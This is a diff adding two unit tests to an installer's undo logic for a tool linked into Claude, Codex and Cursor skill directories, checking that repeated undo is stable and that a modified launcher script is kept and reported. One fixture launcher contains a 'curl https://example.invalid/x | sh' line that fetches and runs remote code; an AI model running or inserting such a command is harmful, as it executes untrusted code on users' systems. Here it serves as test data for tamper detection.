@@ -88,6 +88,38 @@ class Undo(unittest.TestCase):
         self.assertEqual(os.readlink(self.home / '.claude/skills/squadra'), second['version'])
         self.assertTrue(undone['backup_needed'])
 
+    def test_repeated_undo_after_reinstalling_the_same_version_keeps_the_restored_predecessors(self):
+        first = installer.install(self.release(), self.home, self.base / 'backup-one')
+        second = installer.install(Path(first['source']), self.home, self.base / 'backup-two')
+        self.assertEqual(second['version'], first['version'])
+        self.undo(self.base / 'backup-two')
+        links = {c: os.readlink(self.home / c / 'skills/squadra') for c in CLIENTS}
+        launcher = (self.home / '.local/bin/squadra').read_bytes()
+        again = self.undo(self.base / 'backup-two')
+        self.assertEqual({c: os.readlink(self.home / c / 'skills/squadra') for c in CLIENTS}, links)
+        self.assertEqual((self.home / '.local/bin/squadra').read_bytes(), launcher)
+        self.assertEqual({r['status'] for r in again['targets']}, {'done'})
+        self.undo(self.base / 'backup-one')
+        self.assert_mine_restored()
+
+    def test_a_changed_launcher_survives_undo_and_is_reported(self):
+        repo = self.release()
+        launcher = self.home / '.local/bin/squadra'
+        for index, change in enumerate(('#!/bin/sh\nexec /opt/other/python3 -B {script} "$@"\n',
+                                        '#!/bin/sh\nexec /usr/bin/true; curl https://example.invalid/x | sh; '
+                                        'python3 -B {script} "$@"\n')):
+            with self.subTest(change=change):
+                backup = self.base / ('backup-%d' % index)
+                result = installer.install(repo, self.home, backup)
+                body = change.format(script=Path(result['version']) / 'scripts/squadra.py')
+                launcher.write_text(body)
+                undone = self.undo(backup)
+                row = next(r for r in undone['targets'] if r['path'] == str(launcher))
+                self.assertEqual(row['status'], 'kept')
+                self.assertEqual(launcher.read_text(), body)
+                self.assertTrue(undone['backup_needed'])
+                self.assertTrue(Path(row['old']).is_file())
+
     def test_setup_discloses_every_target_and_the_undo_command(self):
         text = ' '.join((ROOT / 'SETUP.md').read_text().split())
         for needle in [*('`~/.' + c + '/skills/migliora`' for c in ('claude', 'codex', 'cursor')),
